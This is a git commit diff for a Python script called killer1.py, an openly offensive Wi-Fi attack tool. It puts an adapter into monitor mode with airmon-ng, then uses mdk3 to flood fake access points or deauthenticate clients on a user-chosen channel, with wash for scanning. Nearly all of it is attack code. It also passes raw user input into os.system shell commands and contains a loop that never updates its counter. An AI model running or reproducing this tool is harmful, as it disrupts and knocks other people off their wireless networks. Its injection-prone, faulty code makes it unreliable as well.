37b4d6b51299244531428904fc8ce8b6eb637d8f
root <root@localhost.localdomain>
2017-08-20 22:31:53 -0400

    automated monitor mode

--- killer1.py
+++ killer1.py
@@ -1,27 +1,37 @@
 import os
 import time
 data1=input("1.Fake access points 2.Deauth 3.Scan networks: ")
-wlandata=input("What is your adapter example wlan0mon: ")
+wlandata=input("What is your adapter example wlan0: ")
+
+def monitormode():
+    if ("mon" in wlandata):
+        pass
+    else:
+        os.system("airmon-ng start " + wlandata)
+
+
+monitormode()
+print("Trying to ACTIVE monitormode if already in monitormode nothing will be done")
+mondata=input("What is your monitormode adapter name? (example wlan0mon): ")
 
 
 if (data1=="1"):
-    print("ACTIVE")
-    xd=os.system("mdk3 " + wlandata + " b -t xx:xx:xx:xx:xx:xx -c X")
+    print ("ACTIVE")
+    xd=os.system("mdk3 " + mondata + " b -t xx:xx:xx:xx:xx:xx -c X")
     while xd<1000:
         xd + 50
 
 
 elif(data1=="2"):
     print("Scanning networks")
-    os.system("gnome-terminal -e 'wash -i wlan0mon'")
+    os.system("gnome-terminal -e 'bash -c \"wash -i " + mondata + "; bash\" '")
     time.sleep(5)
     channelinput=input("Give me a channel number: ")
     print("ACTIVE")
-    os.system("mdk3 "+ wlandata + " d -c " + channelinput)
+    os.system("mdk3 "+ mondata + " d -c " + channelinput)
 
 elif(data1=="3"):
-    print("Scanning")
-    os.system("gnome-terminal -e 'wash -i '" + wlandata)
+    os.system("gnome-terminal -e 'wash -i '" + mondata)
 
 
 
